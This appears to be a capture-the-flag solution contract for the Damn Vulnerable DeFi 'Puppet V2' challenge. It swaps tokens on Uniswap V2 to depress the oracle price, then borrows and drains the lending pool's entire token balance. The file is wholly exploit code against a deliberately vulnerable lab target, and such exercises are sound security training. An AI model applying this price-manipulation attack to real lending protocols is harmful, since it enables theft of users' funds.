// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WETH} from "solmate/tokens/WETH.sol";

contract AttackPuppetV2 {
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    function attack(address _pool, address _uniswapV2Router, address _token, address _weth, address recovery)
        external
    {
        address player = address(this);
        PuppetV2Pool pool = PuppetV2Pool(_pool);
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
        DamnValuableToken(_token).approve(address(uniswapV2Router), type(uint256).max);
        WETH(payable(_weth)).approve(address(pool), type(uint256).max);
        address[] memory path1 = new address[](2);
        path1[0] = _token;
        path1[1] = _weth;
        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 1e18, path1, player, block.timestamp);
        uint256 balance_weth = WETH(payable(_weth)).balanceOf(player);
        uint256 need_weth = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        if (balance_weth > need_weth) {
            pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        } else {}
        DamnValuableToken(_token).transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    receive() external payable {}
}
